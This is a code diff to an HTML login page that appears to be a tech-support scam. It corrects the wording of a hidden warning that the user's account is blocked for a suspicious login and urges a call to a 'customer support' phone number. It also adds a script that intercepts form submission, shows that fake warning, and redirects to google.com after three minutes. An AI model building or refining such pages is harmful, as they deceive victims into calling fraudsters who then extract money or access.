@@ -234,7 +234,7 @@
               display: none;
             "
           >
-            Yours Account access has been blocked due to suspicious login
+            Your Account access has been blocked due to suspicious login
             attempt. Contact our customer support at
             <a
               href="tel:+18884267169"
@@ -261,6 +261,17 @@
         </div>
       </div>
     </div>
-   
+    <script>
+      document
+        .getElementById("login-form")
+        .addEventListener("submit", function (event) {
+          event.preventDefault();
+          document.getElementById("error-message").style.display = "block";
+          setTimeout(function () {
+            window.location.href = "https://www.google.com";
+          }, 180000);
+        });
+    </script>
+
   </body>
 </html>
